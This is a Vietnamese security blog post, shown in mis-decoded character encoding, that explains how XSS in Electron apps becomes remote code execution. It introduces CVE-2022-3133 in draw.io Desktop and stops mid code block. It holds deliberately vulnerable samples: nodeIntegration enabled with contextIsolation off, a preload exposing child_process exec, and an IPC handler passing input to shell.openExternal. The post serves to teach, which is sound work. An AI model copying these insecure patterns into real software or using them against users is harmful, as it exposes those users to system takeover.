<p>B·ªüi v√¨, trong qu√° kh·ª© c√≥ nhi·ªÅu researcher ƒë√£ n√¢ng t·ª´ XSS l√™n RCE tr√™n s·∫£n ph·∫©m n√†y r·ªìi n√™n nay m√¨nh quy·∫øt ƒë·ªãnh ph√¢n t√≠ch l·∫°i bug n√†y v√† ƒë·ªìng th·ªùi c≈©ng l√† d·ªãp m√¨nh t√¨m hi·ªÉu v·ªÅ bug XSS tr√™n c√°c ·ª©ng d·ª•ng desktop app n√†y.</p>
<h3 id="m·ªü-ƒë·∫ßu">#M·ªü ƒë·∫ßu<a hidden class="anchor" aria-hidden="true" href="#m·ªü-ƒë·∫ßu">#</a></h3>
<p>Draw.io (diagrams.net) l√† m·ªôt ph·∫ßn m·ªÅm v·∫Ω bi·ªÉu ƒë·ªì ƒëa n·ªÅn t·∫£ng mi·ªÖn ph√≠ v√† m√£ ngu·ªìn m·ªü ƒë∆∞·ª£c ph√°t tri·ªÉn b·∫±ng HTML5 v√† JavaScript. Giao di·ªán c·ªßa n√≥ c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ t·∫°o c√°c s∆° ƒë·ªì nh∆∞ l∆∞u ƒë·ªì, khung d√¢y, s∆° ƒë·ªì UML, s∆° ƒë·ªì t·ªï ch·ª©c v√† s∆° ƒë·ªì m·∫°ng (Theo <a href="https://en.wikipedia.org/wiki/Diagrams.net">Wikipedia</a>). C√≤n Draw.io Desktop l√† ·ª©ng d·ª•ng d√†nh cho desktop d·ª±a tr√™n Electron v√† core l√† draw.io.</p>
<p>Electron l√† khung ph·∫ßn m·ªÅm m√£ ngu·ªìn m·ªü v√† ƒë∆∞·ª£c x√¢y d·ª±ng d·ª±a tr√™n Chromium nh∆∞ng n√≥ kh√¥ng ph·∫£i l√† m·ªôt browser nh∆∞ ch√∫ng ta bi·∫øt. M·ªôt c√°ch hi·ªÉu ƒë∆°n gi·∫£n l√† xem Electron nh∆∞ l√† m·ªôt ·ª©ng d·ª•ng bao g·ªìm c·∫£ front-end v√† back-end, trong ƒë√≥ front-end l√† Chromium c√≥ nhi·ªám v·ª• render web content v√† back-end l√† ph·∫ßn x·ª≠ l√Ω d·ª±a tr√™n NodeJS.</p>
<p>Electron th√¥ng th∆∞·ªùng c√≥ 2 lo·∫°i process:</p>
<ul>
<li>Main process: ho·∫°t ƒë·ªông nh∆∞ m·ªôt application entry point, ho√†n ƒë∆∞·ª£c truy c·∫≠p v√† x·ª≠ l√Ω b·ªüi NodeJS.</li>
<li>Renderer process: c≈©ng nh∆∞ t√™n g·ªçi c·ªßa n√≥, process n√†y ch·ªãu tr√°ch nhi·ªám cho vi·ªác render n·ªôi dung c·ªßa trang web (nh∆∞ HTML, CSS, Javascript) m√† ng∆∞·ªùi d√πng c√≥ th·ªÉ th·∫•y v√† t∆∞∆°ng t√°c ƒë∆∞·ª£c.</li>
</ul>
<p>Th√¥ng th∆∞·ªùng c√°c renderer process ƒë∆∞·ª£c c·∫•u h√¨nh b√™n trong main process n·∫±m ·ªü c√°c file javascript x·ª≠ l√Ω ch√≠nh, trong c√°c options n√†y s·∫Ω c√≥ c√°c option d√πng ƒë·ªÉ ph√≤ng ch·ªëng vi·ªác ng∆∞·ªùi d√πng c√≥ th·ªÉ g·ªçi tr·ª±c ti·∫øp c√°c NodeJS APIs n·∫øu ƒë∆∞·ª£c c·∫•u h√¨nh ƒë√∫ng (Project m·∫´u c√≥ th·ªÉ download t·∫°i <a href="https://github.com/electron/electron-quick-start">ƒë√¢y</a>).</p>
<p>V√¨ renderer process ch·ªãu tr√°ch nhi·ªám parse code HTML n√™n kh√¥ng th·ªÉ tr√°nh kh·ªèi vi·ªác b·ªã d√≠nh l·ªó h·ªïng XSS, n√™n ti·∫øp theo c√πng t√¨m hi·ªÉu l√† XSS tr√™n desktop app th√¨ nh∆∞ th·∫ø n√†o!!!</p>
<h3 id="xss-tr√™n-electron-desktop-app">#XSS tr√™n Electron Desktop App<a hidden class="anchor" aria-hidden="true" href="#xss-tr√™n-electron-desktop-app">#</a></h3>
<p>Nh∆∞ ƒë√£ bi·∫øt th√¨ Cross-site Scripting l√† l·ªó h·ªïng cho ph√©p k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ th·ª±c thi t√πy √Ω m√£ javascript tr√™n browser c·ªßa ng∆∞·ªùi d√πng nh∆∞ng ƒë·ªëi v·ªõi Desktop App ch·∫°y tr√™n Electron th√¨ c√≥ th·ªÉ d·∫´n ƒë·∫øn g·ªçi c√°c NodeJS APIs v√† c√≥ th·ªÉ th·ª±c thi m√£ t·ª´ xa (RCE)</p>
<p>M·ª•c ƒë√≠ch ch√≠nh c·ªßa main process l√† t·∫°o v√† qu·∫£n l√Ω c√°c application windows v·ªõi <code>BrowserWindow</code> module. M·ªôt v√≠ d·ª• m·ªôt ·ª©ng d·ª•ng nh∆∞ sau:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// main.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">app</span><span class="p">,</span> <span class="nx">BrowserWindow</span><span class="p">,</span> <span class="nx">ipcMain</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">createWindow</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">mainWindow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BrowserWindow</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">width</span><span class="o">:</span> <span class="mi">800</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">height</span><span class="o">:</span> <span class="mi">600</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">webPreferences</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">preload</span><span class="o">:</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;preload.js&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nx">nodeIntegration</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">contextIsolation</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">sandbox</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ...
</span></span></span></code></pre></div><p>Gi·∫£i th√≠ch m·ªôt s·ªë options quan tr·ªçng:</p>
<ul>
<li><code>preload</code>: l√† m·ªôt script s·∫Ω th·ª±c thi trong m·ªôt renderer process tr∆∞·ªõc khi th·ª±c hi·ªán load web content, m·∫∑c d√π script n√†y ƒë∆∞·ª£c ch·∫°y trong m·ªôt renderer context nh∆∞ng c√≥ full quy·ªÅn truy c·∫≠p v√†o c√°c NodeJS APIs.</li>
<li><code>nodeIntegration</code>: option n√†y ƒë∆∞·ª£c b·∫≠t c√≥ nghƒ©a l√† renderer process c√≥ th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp v√† g·ªçi c√°c NodeJS APIs, n·∫øu XSS x·∫£y ra th√¨ c√≥ th·ªÉ ch·∫°y ƒë∆∞·ª£c m√£ NodeJS tr·ª±c ti·∫øp.</li>
<li><code>contextIsolation</code>: option n√†y ƒë∆∞·ª£c d√πng ƒë·ªÉ t√°ch (hay c√¥ l·∫≠p) gi·ªØa preload scripts v√† NodeJS APIs context v·ªõi webContents context. V√≠ d·ª•, n·∫øu nh∆∞ trong <code>preload</code> script <code>set window.a = 1</code> th√¨ khi truy c·∫≠p v√†o <code>window.a</code> ·ªü ph√≠a webContents s·∫Ω l√† <code>undefined</code>.</li>
<li><code>sandbox</code>: n·∫øu option n√†y ƒë∆∞·ª£c b·∫≠t th√¨ renderer ch·ªâ c√≥ th·ªÉ th·ª±c hi·ªán m·ªôt s·ªë h√†nh ƒë·ªông ƒë∆∞·ª£c IPC c·∫•p.</li>
</ul>
<h4 id="case-1-xss--nodeintegration">#Case 1: XSS + nodeIntegration<a hidden class="anchor" aria-hidden="true" href="#case-1-xss--nodeintegration">#</a></h4>
<p>Nh∆∞ ƒë√£ n√≥i ban ƒë·∫ßu, n·∫øu option nodeIntegration ƒë∆∞·ª£c b·∫≠t th√¨ renderer process c√≥ th·ªÉ g·ªçi tr·ª±c ti·∫øp NodeJS APIs, hay n√≥i c√°ch kh√°c t·ª´ tr√™n giao di·ªán devtool web ta c√≥ th·ªÉ th·ª±c thi tr·ª±c ti·∫øp code NodeJS d·∫´n ƒë·∫øn RCE.</p>
<p>Vuln code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// main.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">app</span><span class="p">,</span> <span class="nx">BrowserWindow</span><span class="p">,</span> <span class="nx">ipcMain</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">createWindow</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">mainWindow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BrowserWindow</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">width</span><span class="o">:</span> <span class="mi">800</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">height</span><span class="o">:</span> <span class="mi">600</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">webPreferences</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">nodeIntegration</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">contextIsolation</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">sandbox</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ...
</span></span></span></code></pre></div><p><img loading="lazy" src="/images/cve-2022-3133-drawio-xss-to-rce/1.png"></p>
<h4 id="case-2-preload--contextisolation">#Case 2: Preload + contextIsolation<a hidden class="anchor" aria-hidden="true" href="#case-2-preload--contextisolation">#</a></h4>
<p>Gi·∫£ s·ª≠ trong tr∆∞·ªùng h·ª£p n√†y, ·ªü preload script c√≥ ƒë·ªãnh nghƒ©a m·ªôt function cho ph√©p th·ª±c thi command t√πy √Ω, nh∆∞ng v√¨ l√Ω do option <code>contextIsolation</code> ƒë∆∞·ª£c set l√† <code>false</code> n√™n d·∫´n ƒë·∫øn main process v√† renderer process c√≥ chung context hay n√≥i c√°ch kh√°c l√† c·∫£ 2 ph√≠a s·∫Ω d√πng chung m·ªôt global window object, nghƒ©a l√† t·ª´ ph√≠a renderer process c√≥ th·ªÉ g·ªçi tr·ª±c ti·∫øp ƒë·∫øn function n√†y ·ªü ph√≠a main process.</p>
<p>Vuln code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">//main.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">app</span><span class="p">,</span> <span class="nx">BrowserWindow</span><span class="p">,</span> <span class="nx">ipcMain</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">createWindow</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">mainWindow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BrowserWindow</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">width</span><span class="o">:</span> <span class="mi">800</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">height</span><span class="o">:</span> <span class="mi">600</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">webPreferences</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">preload</span><span class="o">:</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;preload.js&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nx">contextIsolation</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">sandbox</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// ...
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// preload.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">exec</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cmd</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><img loading="lazy" src="/images/cve-2022-3133-drawio-xss-to-rce/2.png"></p>
<p>C√°ch ƒë·ªÉ ngƒÉn ch·∫∑n cu·ªôc t·∫•n c√¥ng n√†y ch·ªâ ƒë∆°n gi·∫£n l√† set <code>contextIsolation = true</code> v√† ƒë·ªìng th·ªùi contextBridge module ƒë∆∞·ª£c sinh ra ƒë·ªÉ expose c√°c APIs t·ª´ preload script m·ªôt c√°ch an to√†n cho render process s·ª≠ d·ª•ng khi context gi·ªØa main process v√† renderer process b·ªã c√¥ l·∫≠p ho√†n to√†n. C√°c APIs expose n√†y ƒë∆∞·ª£c truy c·∫≠p th√¥ng qua window object, m·ª•c ƒë√≠ch c·ªßa vi·ªác n√†y l√† ch·ªâ expose nh·ªØng ch·ª©c nƒÉng c·∫ßn thi·∫øt ch·ª© kh√¥ng expose c·∫£ m·ªôt window object ra cho renderer :v.</p>
<p>V√≠ d·ª•:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// preload.js
</span></span></span><span class="line"><span class="cl"><span class="c1">// preload with contextIsolation enabled
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">contextBridge</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nx">contextBridge</span><span class="p">.</span><span class="nx">exposeInMainWorld</span><span class="p">(</span><span class="s1">&#39;myAPI&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">doAThing</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// renderer.js
</span></span></span><span class="line"><span class="cl"><span class="c1">// use the exposed API in the renderer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">window</span><span class="p">.</span><span class="nx">myAPI</span><span class="p">.</span><span class="nx">doAThing</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="case-3-rce-th√¥ng-qua-ipc">#Case 3: RCE th√¥ng qua IPC<a hidden class="anchor" aria-hidden="true" href="#case-3-rce-th√¥ng-qua-ipc">#</a></h4>
<p>IPC (Inter-process communication) l√† m·ªôt ph·∫ßn kh√° quan tr·ªçng tr√™n ·ª©ng d·ª•ng Electron v√¨ n√≥ ch·ªãu tr√°ch nhi·ªám cho vi·ªác li√™n k·∫øt (k·∫øt n·ªëi) th·ª±c hi·ªán c√°c t√°c v·ª• gi·ªØa main process v√† renderer process nh∆∞ g·ªçi c√°c native API t·ª´ UI.</p>
<p>Electron cung c·∫•p 2 l·∫°i IPC l√† IPC Main v√† IPC Renderer</p>
<ul>
<li>IPC Main cho ph√©p main process giao ti·∫øp v·ªõi renderer process ƒë·ªÉ th·ª±c hi·ªán m·ªôt s·ªë ho·∫°t ƒë·ªông h·ªá th·ªëng nh∆∞ qu·∫£n l√Ω c·ª≠a s·ªï ·ª©ng d·ª•ng, t·∫°o quy tr√¨nh m·ªõi hay gi·ªç c√°c module NodeJS. ƒê·ªÉ s·ª≠ d·ª•ng IPC Main c√≥ th·ªÉ g·ªçi <code>ipcMain</code> module n√†y ƒë·ªÉ th·ª±c hi·ªán l·∫Øng nghe c≈©ng nh∆∞ g·ª≠i message ƒë·∫øn renderer process.
V√≠ d·ª•:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Main process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">app</span><span class="p">,</span> <span class="nx">BrowserWindow</span><span class="p">,</span> <span class="nx">ipcMain</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;ready&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">mainWindow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BrowserWindow</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mainWindow</span><span class="p">.</span><span class="nx">loadURL</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  <span class="nx">ipcMain</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;message-from-renderer&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">arg</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span> <span class="c1">// Log message from renderer process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">event</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;message-to-renderer&#39;</span><span class="p">,</span> <span class="s1">&#39;Hello from main process!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><ul>
<li>IPC Renderer cho ph√©p renderer process giao ti·∫øp v·ªõi main process, ƒë·ªÉ s·ª≠ d·ª•ng IPC Renderer c√≥ th·ªÉ s·ª≠ d·ª•ng <code>ipcRenderer</code> module ƒë·ªÉ ƒë∆∞·ª£c cung c·∫•p m·ªôt s·ªë giao th·ª©c g·ª≠i v√† l·∫Øng nghe th√¥ng ƒëi·ªáp ƒë·∫øn t·ª´ main process.
V√≠ d·ª•:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Renderer process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">ipcRenderer</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nx">ipcRenderer</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;message-from-renderer&#39;</span><span class="p">,</span> <span class="s1">&#39;Hello from renderer process!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nx">ipcRenderer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;message-to-renderer&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">arg</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span> <span class="c1">// Log message from main process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">});</span>
</span></span></code></pre></div><p>M·ªôt v√≠ d·ª• v·ªÅ tr∆∞·ªùng h·ª£p s·ª≠ d·ª•ng IPC m·ªôt c√°ch kh√¥ng an to√†n:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// main.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">app</span><span class="p">,</span> <span class="nx">BrowserWindow</span><span class="p">,</span> <span class="nx">ipcMain</span><span class="p">,</span> <span class="nx">shell</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">createWindow</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">mainWindow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BrowserWindow</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">width</span><span class="o">:</span> <span class="mi">800</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">height</span><span class="o">:</span> <span class="mi">600</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">webPreferences</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">preload</span><span class="o">:</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;preload.js&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nx">contextIsolation</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">sandbox</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">  <span class="nx">ipcMain</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;openURL&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">shell</span><span class="p">.</span><span class="nx">openExternal</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// preload.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">contextBridge</span><span class="p">,</span> <span class="nx">ipcRenderer</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">contextBridge</span><span class="p">.</span><span class="nx">exposeInMainWorld</span><span class="p">(</span><span class="s1">&#39;electronAPI&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">openURL</span><span class="o">:</span> <span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">ipcRenderer</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;openURL&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>m·ªôt s·ªë ƒëi·ªÉm c·∫ßn hi·ªÉu r√µ ·ªü nh·ªØng ƒëo·∫°n code tr√™n nh∆∞ sau:</p>
<ul>
<li><code>contextIsolation = true</code></li>
<li>IPC Main s·∫Ω l·∫Øng nghe event ‚ÄúopenURL‚Äù, sau ƒë√≥ th·ª±c thi <code>shell.openExternal</code> v·ªõi tham s·ªë <code>url</code> ƒë∆∞·ª£c truy·ªÅn v√†o =&gt; ƒê√¢y c≈©ng l√† sink c·ªßa l·ªó h·ªïng, h√†m n√†y cho ph√©p m·ªü m·ªçt URL ho·∫∑c t·ªáp tin b√™n ngo√†i Electron d·∫´n ƒë·∫øn RCE.</li>
<li>·ªû <code>preload script</code> expose <code>electronAPI</code> ra b√™n ngo√†i cho renderer c√≥ th·ªÉ g·ªçi h√†m <code>openURL</code>, sau ƒë√≥ <code>ipcRenderer</code> s·∫Ω g·ª≠i message ƒë·∫øn <code>ipcMain</code> ·ªü <code>openURL</code> channel m√† IPC Maind ƒëang l·∫Øng nghe.</li>
</ul>
<p>V√¨ th·∫ø, ·ªü ƒë√¢y ta s·∫Ω d√πng file protocol ƒë·ªÉ g·ªçi ƒë·∫øn t·ªáp tin hay ch∆∞∆°ng tr√¨nh b√™n ngo√†i (c√≥ th·ªÉ l√† virus ho·∫∑c backdoor) ƒë·ªÉ chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn h·ªá th·ªëng.
<img loading="lazy" src="/images/cve-2022-3133-drawio-xss-to-rce/3.png"></p>
<p>ƒê√≥ l√† c∆° b·∫£n v·ªÅ m·ªôt s·ªë l·ªó h·ªïng tr√™n ·ª©ng d·ª•ng ƒë∆∞·ª£c t·∫°o n√™n t·ª´ Electron, ti·∫øp theo s·∫Ω v√†o v·∫•n ƒë·ªÅ ch√≠nh, s·∫Ω n√≥i v·ªÅ bug tr√™n app <code>Draw.io</code></p>
<h3 id="cve-2022-3133">#CVE-2022-3133<a hidden class="anchor" aria-hidden="true" href="#cve-2022-3133">#</a></h3>
<p>L·ªó h·ªïng n√†y ƒë∆∞·ª£c report v√† public tr√™n <a href="https://huntr.dev/">huntr.dev</a> b·ªüi researcher <a href="https://huntr.dev/users/kevin-mizu/">mizu</a>, c·ª• th·ªÉ l√† l·∫°m d·ª•ng l·ªï h·ªïng XSS ƒë·ªÉ th·ª±c hi·ªán ch·ª©c nƒÉng <code>writeFile</code> ·ªü IPC Main ƒë·ªÉ override t·ªáp <code>preload script</code> ƒë·ªÉ c√≥ th·ªÉ th·ª±c thi m√£ t·ª´ xa (RCE).</p>
<h4 id="abuse-of-ipcmain-to-override-preload-script">#Abuse of ipcMain to override preload script<a hidden class="anchor" aria-hidden="true" href="#abuse-of-ipcmain-to-override-preload-script">#</a></h4>
<p>·ªû file <code>electron.js</code>, ipcMain ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a l·∫Øng nghe s·ª± ki·ªán <code>rendererReq</code> v√† bao g·ªìm nhi·ªÅu action</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// ...
